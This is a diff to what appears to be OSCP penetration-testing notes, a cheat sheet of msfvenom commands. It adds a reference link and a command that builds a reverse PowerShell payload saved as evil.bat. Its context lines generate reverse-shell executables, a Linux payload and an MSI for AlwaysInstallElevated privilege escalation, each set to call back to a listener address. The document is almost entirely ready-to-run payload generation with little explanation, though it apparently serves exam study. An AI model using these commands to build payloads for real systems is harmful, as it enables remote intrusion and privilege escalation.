@@ -1,3 +1,6 @@
+# Resource
+https://gabb4r.gitbook.io/oscp-notes/shell/msfvenom
+
 # For Windows
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.187 LPORT=443 EXITFUNC=thread -f exe > binary.exe
 
@@ -35,3 +38,6 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le
 
 # Windows MSI File (AlwaysInstallElevated )
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.187 LPORT=21 -f msi > priv.msi
+
+# Windows Bat File
+msfvenom -p cmd/windows/reverse_powershell lhost= lport= > evil.bat
